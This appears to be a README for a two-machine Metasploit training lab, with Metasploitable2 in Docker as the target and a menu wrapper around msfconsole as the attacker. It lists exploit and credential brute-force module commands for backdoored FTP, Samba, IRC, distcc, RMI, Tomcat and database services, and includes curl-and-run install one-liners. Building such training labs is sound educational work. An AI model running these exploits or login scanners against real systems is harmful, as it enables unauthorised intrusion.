# Metasploit Lab — Docker Setup

A two-machine penetration testing lab. The target runs in Docker (no ISO
upload required — pulled from Docker Hub); the attacker uses its native
`msfconsole` (e.g. Kali ships with Metasploit Framework built in) driven
by a whiptail attack-menu TUI.

```
┌─────────────────────┐          ┌──────────────────────┐
│   Attacker Machine  │          │    Target Machine     │
│   native msfconsole │─────────▶│   Metasploitable2     │
│   (setup_attacker)  │  network │   (Docker, setup_target) │
└─────────────────────┘          └──────────────────────┘
```

---

## Requirements

- Target machine: Ubuntu 18.04+ or Debian 9+, internet access (pulls the Metasploitable2 image), `sudo` / root access
- Attacker machine: Metasploit Framework installed (`msfconsole` on PATH — e.g. Kali's default install), `sudo` / root access
- Both machines on the same network

---

## Quick Start

### 1. Target Machine — Run Metasploitable2

Clone and run:
```bash
git clone https://github.com/sudichai/metasploitable2-docker-lab.git
cd metasploitable2-docker-lab
sudo bash target/setup_target.sh
```

Or pull and run in one line, no clone needed:
```bash
sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/sudichai/metasploitable2-docker-lab/master/target/setup_target.sh)"
```

This will:
- Install Docker if not present
- Pull `tleemcjr/metasploitable2` image
- Start container with `--network host` (target uses the host machine's real IP)
- Wait 30 seconds for all services to start
- Verify all ports and processes are running

**Vulnerable services exposed:**

| Port | Service |
|------|---------|
| 21 | FTP (vsftpd 2.3.4 backdoor) |
| 22 | SSH |
| 23 | Telnet |
| 80 | HTTP (Apache + DVWA + Mutillidae) |
| 139/445 | Samba (usermap_script) |
| 1099 | Java RMI |
| 3306 | MySQL (no root password) |
| 3632 | distccd |
| 5432 | PostgreSQL (weak credentials) |
| 5900 | VNC |
| 6667/6697 | UnrealIRCd (backdoor) |
| 8009 | Tomcat AJP |
| 8180 | Tomcat HTTP Manager |
| 8787 | Ruby DRb |

---

### 2. Attacker Machine — Attack Menu (native msfconsole)

No Docker needed here — the script drives the `msfconsole` already installed on the machine (Kali includes it by default).

```bash
git clone https://github.com/sudichai/metasploitable2-docker-lab.git
cd metasploitable2-docker-lab
sudo bash attacker/setup_attacker.sh
```
Or without cloning:
```bash
sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/sudichai/metasploitable2-docker-lab/master/attacker/setup_attacker.sh)"
```
> Use `bash -c "$(curl ...)"` rather than `curl | bash` — piping would hand the script's stdin to curl's output instead of your terminal, breaking the TUI.

The script:
- Checks `msfconsole` is on PATH (exits with an install hint if not — Metasploit itself is not auto-installed, it's a large framework)
- Installs `whiptail` automatically if missing (its only dependency)
- Shows a TUI input box asking for the target IP
- Shows a TUI menu of known Metasploitable2 exploit modules to pick from (or "open msfconsole" for manual/free-form use)
- Before running, shows an attack-detail screen (module path, port, what the vulnerability is, expected outcome) — confirm with **Run** or go **Back** to the menu
- Runs `msfconsole` with `LHOST`/`RHOSTS` pre-set for the chosen module, then automatically exits back to the menu (no more getting stuck at an interactive `msf6 >` prompt)
- After each run, asks whether to launch another module against the same target

---

## Useful MSF Modules for Metasploitable2

These 8 modules are built into the attack-menu TUI (`setup_attacker.sh`) — pick a number and it runs the module for you. Shown here for reference / manual use inside `msfconsole` (menu option 9).

```
# FTP Backdoor (port 21)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
run

# Samba (port 445)
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
run

# UnrealIRCd Backdoor (port 6667)
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <TARGET_IP>
run

# distccd (port 3632)
use exploit/unix/misc/distcc_exec
set RHOSTS <TARGET_IP>
run

# Java RMI (port 1099)
use exploit/multi/misc/java_rmi_server
set RHOSTS <TARGET_IP>
run

# Tomcat Manager (port 8180) — brute force first
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <TARGET_IP>
set RPORT 8180
run

# PostgreSQL weak credentials (port 5432)
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <TARGET_IP>
run

# MySQL no root password (port 3306)
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <TARGET_IP>
set USERNAME root
run
```

---

## Container Management

### Target machine
```bash
sudo docker ps                              # check status
sudo docker logs metasploitable             # view logs
sudo docker exec -it metasploitable bash    # open shell inside
sudo docker stop metasploitable             # stop
sudo docker start metasploitable            # start again
```

### Attacker machine
```bash
# No container to manage — msfconsole runs natively.
# Re-run the attack menu to start a new session:
sudo bash attacker/setup_attacker.sh
```

---

## Network Architecture

The target container runs with `--network host`, binding directly to the real IP of its host machine — no port mapping or NAT needed. The attacker side has no container at all; `msfconsole` runs natively and reaches the target over the regular network.

```
Kali / Attacker       Firewall / Router       Target (Metasploitable2)
192.168.x.x     ───────────────────────────▶  192.168.x.x
msfconsole (native)                             all vulnerable ports open
```

---

## Security Warning

> **⚠️ WARNING**  
> Metasploitable2 contains **real, intentionally unpatched vulnerabilities**.  
> Always run this lab in an **isolated network** (no internet exposure).  
> Never expose the target machine to a production or shared network.

---

## Tested On

- Ubuntu 20.04 LTS (target machine)
- Kali Linux 2024 (attacker machine)
